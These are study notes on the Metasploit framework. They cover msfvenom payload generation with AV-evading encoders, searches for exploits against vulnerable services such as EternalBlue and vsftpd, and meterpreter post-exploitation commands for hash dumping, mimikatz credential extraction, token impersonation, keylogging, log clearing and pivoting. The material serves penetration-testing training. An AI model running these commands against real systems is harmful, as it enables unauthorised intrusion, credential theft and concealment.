# METASPLOIT

Open source robust penetration testing and exploitatios framework.

Provides infraestructure to automate every stage of the penetration testing. Also used to develop and test exploits.

- Module: code that performs a particular task
- Exploi: code that takes advantage of a specific vuln
- Payload: code delivered to the target by the exploit
- Listener: utility that listens an incoming connection
- Armitage: GUI for metasploit that simplifies discovery, exploitation and post exploitation.

MSF Architecture:

![Alt text](image-5.png)

- Exploit: module used to take advantage of vuln
- Payload: code delivered by exploit exucuted in memory.
- Encoder: encode payloads in order to avoid AV detection
- NOPS: ensure stability of payloads
- Auxiliary: additional funcionality like port scanning and enumeration

MSF Payloads:
- Non staged: payload sent as it is `meterpreter/reverse`
- Staged: `meterpreter_reverse`
    - Stager: establish communication and stage payload is downloaded
    - Stage: payload components downloaded

Important location:
- /usr/share/metasploit-framework/modules
- ~/.ms4/modules

## PENETRATION TESTING WITH METASPLOIT

We can adopt PTES methodology as a roadmap with the various phases that make up a penetration test and how Metasploit can be integrated in to each phase.
1. Information gathering: auxiliary modules
2. Enumeration: auxiliary modules
3. Vulnerability scanning: auxiliary modules
4. Exploitation: exploit modules and payloads
5. Post exploitation: meterpreter
    4.1. Privilege escalation: meterpretes and post exploitation modules
    4.2. Persistance: meterpreter and post exploitation modules
    4.3. Clearing tracks

Load Postgresql before initatiating Metasploit:
```service postgresql start```

### Metasploit variables
![Alt text](image-6.png)
### Metasploit workspaces
Workspaces allows us to keep track of hosts, scans and activities
```
workspace -h
workspace <>  ##move to a workspace
workspace -a <>  #create workspaces
workspace -d <>  #delete workspaces
hosts
services
loot
creds
vulns
```

### Metasploit and Nmap 
Nmap helps us with
- Discovering
- Scanning
- Enumeration
To integrate nmap results in metasploit follow these steps:
1. Save nmap output: `-oX <name.xml>`
2. Import results in metasploit: `db_import <path to xml>`

Also you can launch nmap inside metasploit with `db_nmap` command and results will be saved.

### Auxiliary modules

- **Scanning**
- **Fuzzing and information gathering**
- **Discovering hosts and ports**

`search portscan`

**Methodology**:
1. Discover open ports
2. Exploiting services
3. Pivoting
4. Same in second target

### Msfvenom 
Generate and enconde payloads. Two utilities msfpayload and msfenconde. It is used to generate a malicious meterpreter payload and transfer it to the target system.
1. Exploit with a payload the targer
2. Payload is executed on the target and connects back to smf console.
3. Msfconsole sends meterpreter session.
3. Connection between atacker and victim.

**Encoders** help us to evade old signature based AV solutions. the objective of encoder is to modify payload signature

```
msfvenom --list encoders
msfvenom --list formats
msfvenom --list payloads
msfvenom -a <architecture> -p <payload> LHOST=<> LPORT=<> -i <how many times payload should be encoded> -e <tecnique> -f exe > <>
```

### Vulnerability scanning:
- Nessus with db_import
- WMAP
```
load wmap
wmap_sites -a <target>
wmap_sites -l
wmap_targets -t <target>
wmap_targets -l
wmap_run -t  ##vuln scan
wmap_run -e  ##enumeration
wmap_vulns -l
```
### Exploitation of vulnerable services

**1. HTTP File Server**

HFS was designed for dile and document sharing. Runs on TCP port 80 and utilizes HTTP protocol.
**Rejetto HFS V2.3** is vulnerable to remote command execution attack.
`search hfs`

**2. EternalBlue**

SMBv1 protocol is vulnerable to execution of arbitrary commands. The following versions are vulnerable:
- Windows Vista
- Windows 7
- Windows Server 2008
- Windows 8.1
- Windows Server 2012
- Windows 10
- Windows Server 2016
`search eternalblue`

**3. WinRM**

Windows remote management protocal used to interact with, configure and execute commands on windows systems on a local network. Uses TCP port 5985 and 5986

**4. Apache Tomcat**

Server used to build and host websites. Uses HTTP protocol and runs on port 8080.
**Apache Tomcat V8.5.19** is vulnerable to remote code execution.
`curl <> | grep "xoda"`

**5. FTP**

File transfer protocol uses TCP port 21 to facilitate file sharing between server and client.
**vsftpd V2.3.4** is vulnerable to command execution vulnerability.
`search vsftpd`

**6. SAMBA**

File sharing protocol uses port 445 and on top of NetBIOS uses port 139. 
**samba V3.5.0** is vulnerable to remote code execution vulnerability.

**7. SSH**

Remote administratios protcol on port 22. **libssh V0.6.0-0.8.0** is vulnerable to authentication bypass vulnerability.

**8. SMTP**

Protocol that enables transmission of emails. Runs on port 25, 465, 587. **haraka < V2.8.9** are vulnerable to command injection.

### Post exploitation

**Meterpreter fundamentals**

Meterpreter is a paylaod that is used to be executed in memory on the target system. Provides an attacker with an interactive command interpreter in the target system. Allows us to load costum scripts.

**Most used commands**:
```
help
background
cat
cd 
pwd
clearev
download <path>
edit <file>
execute -f <command to be run on target system> -i -H
getuid
hashdump (run post/windows/gather/hashdump)
idletime
ipconfig
ls
migrate
ps
search
shell
upload
showmount
screenshot
pgrep <>
portfwd list
```

**Methodology**:
- Enumerate user privileges
- Enumerate
- VM check
- Enumerate
- Enumerate installed programs
- Enumerate AVs
- Enumerate installed patches
- Enumerate shares

**Modules**
```
search
    migrate
    win_privs
    applications
    logged_on
    check_vm
    enum_av
    enum_computer
    enum_patches
    enum_shares
```

### Windows 

**1. Bypassing UAC**

`search bypassuac_injection`

**2. Token impersonation**

Privileges required for a succsessful impersonation attac:
- SeAssignPrimaryToken
- SeCreateToken
- SeImpersonarePrivilege

**Incognito** is a meterpreter module that can impersonate user tokens after successful exploitation.

**Note**: migrate to lsass, explorer processes
```
use incogmito
    list_tokens -u
    impersonate_token -token <token>
    impersonate_token <token>
```

**3. Mimikatz**

Post exploitation tool that allows us to extract credentials from memory and password hashes from SAM databases. The meterpreter extensions is called kiwi. 
```
load kiwi
     creds_all
     lsa_dump_sam
     lsa_dump_secrets
upload /usr/share/windows-resources/mimikatz/<arh>/mimmikatz.exe
./mimikatz.exe
    lsadump:;sam
    sekurlsa:;logonPasswords
```

**4. Pass The Hash**

The psexec module is often used by penetration testers to obtain access to a given system that you already know the credentials for.
`search psexec`

**5. Persistence**

Search for post exploitation persistence modules.
`search platform:windows persistence`

**6. RDP**

Remote access protocol on port 3389. Utilized to remotly access to a system.
```
search enable_rdp
use ...
run
    shell
        net user administrator <new pass>

xfreerdp /u:<user> /p:<pass> /v:<IP>
```

**7. Keylogging**

```
meterpreter> keyscan_start
meterpreter> keyscan_dump
```

**8. Clearing tracks**

`clearev`

**9. Pivoting**

```
run autoroute -s <range>
portfwd add -l <vm1 port> -p <vm2 port> -r <ip>: if we find an open port on second attacker machine then we can forward that port to another one in our local host, for example to port 1234, inside the meterpreter session. then if we do a nmap in the localhost the information of the service of vm2 will be ther
```
